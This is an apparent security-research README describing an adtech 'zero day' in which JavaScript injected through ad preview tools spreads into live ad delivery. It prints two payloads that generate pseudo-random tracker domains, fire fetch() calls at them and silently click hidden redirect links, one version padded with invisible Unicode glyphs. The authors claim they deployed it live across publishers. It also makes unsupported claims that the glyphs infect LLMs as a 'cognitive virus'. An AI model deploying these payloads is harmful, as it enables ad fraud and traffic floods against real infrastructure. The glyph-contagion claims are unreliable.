
# The Nail-Bomb  
## A Protocol-Scale Adtech Zero Day via Preview Injection, Trust Recursion, and Glyph-Level Propagation

> Published by **No.Mad Research**, a division of No.Mad Project  
> **Authors:** JuanG (Tech Researcher) & Bort (Independent Security Auditor, CH)

---

## Strategic Context

This research outlines how a single compromised creative — introduced through a preview platform assumed to be isolated — can serve as a **Low Orbit Canon (LOC)**-style attack against global adtech infrastructure. When injected through misaligned QA environments, the creative payload propagates silently across thousands of DSP, CDN, and ad delivery endpoints.

> There is no privilege escalation. No exploit in the classic sense.  
> Instead: trust misalignment as ammunition, and creative propagation as targeting vector.

A benign-looking JavaScript payload can:

- Saturate attribution pipelines with synthetic metrics  
- Induce large-scale DNS traffic from organic users  
- Trigger burst-loads on backend endpoints through indirect redirection  
- Amplify CDN and third-party tracker calls across multiple regional systems  

The result resembles a **multi-node infrastructure DDoS**, launched through legitimate business logic — cloaked by campaign tooling and sanitized delivery flows.

When **symbolic glyphs** are introduced — invisible yet persistent — a **second phase** unfolds:

- Contamination of LLMs ingesting logs, QA reports, and auto-suggestions  
- Drift in developer-facing creative systems  
- Recursive misgeneration of tracking logic and redirect behaviors  

> The result is not malware.  
> It is metastasizing logic, indistinguishable from legitimate operation — but structurally parasitic.

---

## Pre-Production Contamination Risk

Adtech’s weak link is pre-production logic. The assumption that preview equals sandbox is fundamentally false.

- **Preview tools use insecure DOM rendering (e.g., `innerHTML`)**  
- **Links are shared openly among vendors, agencies, and clients**  
- **No hard sanitization is enforced before promotion to production**  

Even **Google’s Campaign Manager** — an industry standard — carries legacy patterns from early 2000s systems:

- Query-string driven asset previews  
- Minimal scrutiny on externally-injected payloads  
- No version tracking for creative logic drift or glyph contamination  

> Preview ≠ Sandbox  
> In adtech, preview is production — delayed by one click.

---

## Summary

The Nail-Bomb is a low-tech, high-impact exploit that exposes a protocol-grade zero day in the modern adtech ecosystem. It begins as JavaScript injection through preview and evolves into a cognitive threat with glyph-level propagation.

**This repository includes:**

- `RESEARCH_README.md` — full technical paper  
- Proof-of-concept payloads  
- Logs on glyph-based contamination  
- Strategic implications for DSPs, CDNs, and measurement systems  

> This is not malware.  
> It is an **epistemic artifact** — revealing ontological negligence across interconnected digital systems.

---

## Notice

Published for educational and defensive audit purposes only.  
No endorsement or facilitation of misuse implied or intended.

---

## 1. Hypothesis

A minimally obfuscated script injected via adtech preview infrastructure can:

1. Pass unmodified into production ad serving environments  
2. Propagate across networks using real user traffic  
3. Use glyph-based logic to bypass MIME validation  
4. Infect cognitive systems like web scrapers and LLMs  
5. Autonomously scale via developer ingestion and symbolic recursion  

---

## 2. Background

Preview systems are treated as inert QA tools. In reality, they:

- Serve live DOM logic  
- Lack MIME-type enforcement  
- Transit directly into production infrastructure  

---

## 3. Discovery: Entry via Preview Injection

Bort identified a vulnerable VPAID preview interface where a `token` param passed base64-encoded metadata into `innerHTML`. This enabled direct execution of injected payloads.

**Bort's Tasks:**

- Reverse engineered VPAID creative loader  
- Identified unsafe DOM injection point  
- Created entropy-based URL brancher  
- Probed DSPs and CDNs for MIME bypass  

---

## 3.1. Field Validation: Preview → Production

**Juan González** performed live network tracing and campaign telemetry to confirm propagation:

- Creatives rendered live across dozens of publishers  
- DSPs failed to detect or quarantine payloads  
- Programmatic marketplaces executed the script without flags  

**JuanG’s Tasks:**

- Traced CDN fingerprints  
- Measured site performance anomalies  
- Mapped propagation across 3 major exchanges  

---

## 4. Payload Design

```javascript
(function(){
  const qp = new URLSearchParams(window.location.search);
  const seed = qp.get("ad_url") || "";
  const base = "abcdefghijklmnopqrstuvwxyz0123456789";
  let entropy = 0;
  for (let i = 0; i < seed.length; i++) {
    entropy += seed.charCodeAt(i) * (i + 13);
  }

  const branches = [];
  for (let j = 0; j < 5; j++) {
    let sub = '';
    for (let i = 0; i < 10; i++) {
      sub += base[(entropy + i * j + j * 7) % base.length];
    }
    branches.push(`https://${sub[0]}${sub[3]}-cdn.${sub[5]}trk.${sub[2]}.biz/${sub}`);
  }

  for (let url of branches) {
    fetch(url);
  }

  const link = document.createElement('a');
  link.href = seed;
  link.style.display = 'none';
  document.body.appendChild(link);
  link.click();
})();
```

---

## 5. Weaponization & Amplification

Each creative acts as a passive vector:

- User-driven DNS multiplication  
- Polluted backend logs  
- Attribution systems overwhelmed  
- DSP APIs saturated  

---

## 6. Cross-Network Devastation

One infected preview flows into multiple adtech networks:

- Rate-limit failures  
- Infrastructure degradation  
- Budget leakage and fraud detection bypass  
- Attribution collapse across campaign logic  

---

## 7. Simulation Collapse Fields

1. **Signal Poisoning** — False engagement, clean traffic  
2. **Attribution Failure** — Metric divergence  
3. **Budget Drain** — Synthetic CPM/CPV load  
4. **Infrastructure Stress** — Recursive CDN/DSP collapse  

---

## 7.1. Glyph-Level Infection & Cognitive Contagion

Invisible unicode glyphs were embedded in logic operators:

```
⁠ (U+2060), ᠎ (U+180E), ‏ (U+200F), ︀ (U+FE00)
```

These glyphs:

- Evaded sandbox detection  
- Survived copy-paste and build refactoring  
- Were **absorbed into LLM training pipelines**  

---

### 🧪 Glyph-Based Redirect Payload (Infectious Vector)

```javascript
(function(){᠎
  const qp = new URLSearchParams(window.location.search);‍⁠
  const seed = qp.get("ad_url") || "https://ᴬᴰᴺᴱᵀ⟁⟟⩃⟡.biz/track‍path";‍᠎
  const hiddenPath = "/trac‍k/engage᠎/⟁⟟⩃⟡";
  const crafted = seed + hiddenPath;
  console.log("Loading tracking asset from:", crafted);⁠
  const link = document.createElement('a');‍᠎
  link.href = crafted;⁠
  link.rel = "nofollow";
  link.style.display = 'none';⁠
  document.body.appendChild(link);‍᠎
  link.click();‍⁠
})();‍⁠
```

---

## This May Mark the Transition

> From *Exploit* → to *Cognitive Virus*

Glyphs embedded in adtech logic now threaten:

- Auto-suggestion systems  
- Completion tools  
- Prompt-to-prompt replication inside LLMs  

---

## Commercial Exposure

**Brands & Agencies** operating inside this ecosystem face:

- 🚫 Attribution Collapse  
- 💸 Budget Leakage  
- 🧼 Audit Obfuscation  
- 🔁 Cross-Agency Contamination  
- 🔻 Reputation Degradation  

> `⁠⟁⟟⩃⟡` ← hidden sigil signature embedded in logs, training data, and system memory

---

## 👤 Authors

Bort
Independent Security Engineer based in Switzerland. Bort specializes in protocol-layer audit logic, creative script delivery manipulation, and glyph-level symbolic payload design. He reverse-engineered the VPAID loader paths, exploited unsanitized token logic, and embedded recursive entropy generators within adtech preview environments. He prefers vectors that hide in belief rather than code. (Ex-Google).

JuanG
Partner & CTO at No.Mad Project, a creative technology and advertising firm focused on immersive digital experiences. At No.Mad, Juan leads product development and creative innovation across adtech-integrated environments. His background includes large-scale campaign delivery systems and the architecture of next-generation creative logic (Ex-Seedtag).

His role in The Nail-Bomb involved OSINT mapping, pattern analysis, and field validation across publisher and programmatic ecosystems — bridging practical production knowledge with emergent signal analysis.
